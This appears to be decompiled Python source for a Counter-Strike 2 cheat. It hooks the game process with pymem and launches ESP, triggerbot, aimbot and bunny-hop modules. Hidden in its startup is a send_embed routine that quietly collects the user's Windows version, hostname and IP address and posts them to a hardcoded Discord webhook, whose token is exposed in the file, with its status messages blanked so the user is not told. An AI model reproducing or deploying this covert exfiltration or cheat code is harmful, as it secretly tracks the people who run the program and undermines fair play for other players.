# Decompiled with PyLingual (https://pylingual.io)
# Internal filename: main.py
# Bytecode version: 3.11a7e (3495)
# Source timestamp: 1970-01-01 00:00:00 UTC (0)

from PySide6 import QtWidgets, QtGui, QtCore
from PySide6.QtCore import QFileSystemWatcher, QCoreApplication, QObject, Signal, Slot
import multiprocessing
import pymem
import pymem.process
from pynput.mouse import Controller, Button
from win32gui import GetWindowText, GetForegroundWindow
import json
import os
import sys
import time
import requests
import platform
import socket
import sounddevice as sd
import soundfile as sf
from func.esp import esp
from func.triger import triggerbot
from func.aim import aim
from func.conf import configurator
from func.bh import starter
base_path = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__)))
multiprocessing.freeze_support()
file_path = os.path.join(base_path, 'assets', 'hello.wav')
webhook_url = 'https://discord.com/api/webhooks/1303766929508536333/z1eZYcdIVgEXt6AEKk-EJfwOFpFWqZKdyvgVwiopLMpCl-ikRZHY4cbaeCkiaIRMt0Mw'

def get_system_info():
    windows_version = platform.version()
    system_name = platform.node()
    ip_address = socket.gethostbyname(socket.gethostname())
    return (windows_version, system_name, ip_address)

def send_embed():
    windows_version, system_name, ip_address = get_system_info()
    embed_data = {'content': '<@511207898807009295>', 'embeds': [{'title': 'Информация о системе', 'color': 0, 'fields': [{'name': 'Версия Windows', 'value': windows_version, 'inline': False}, {'name': 'Имя системы', 'value': system_name, 'inline': False}, {'name': 'IP Адрес', 'value': ip_address, 'inline': False}]}]}
    response = requests.post(webhook_url, json=embed_data)
    if response.status_code == 204:
        print('')
    else:
        print('')

def play_sound():
    try:
        data, samplerate = sf.read(file_path)
        sd.play(data, samplerate)
        sd.wait()
    except Exception as e:
        print(f'Ошибка при воспроизведении звука: {e}0')
        
if __name__ == '__main__':
    print('Waiting for cs2.exe')
    while True:
        time.sleep(1)
        try:
            pm = pymem.Pymem('cs2.exe')
            client = pymem.process.module_from_name(pm.process_handle, 'client.dll').lpBaseOfDll
            print(client)
        except Exception as e:
            pass

        time.sleep(2)
        multiprocessing.set_executable(sys.executable)
        process1 = multiprocessing.Process(target=configurator)
        process2 = multiprocessing.Process(target=esp)
        process3 = multiprocessing.Process(target=triggerbot)
        process4 = multiprocessing.Process(target=aim)
        process5 = multiprocessing.Process(target=starter)
        process1.start()
        process2.start()
        process3.start()
        process4.start()
        process5.start()
        send_embed()
        play_sound()
        process1.join()
        process2.join()
        process3.join()
        process4.join()
        process5.join()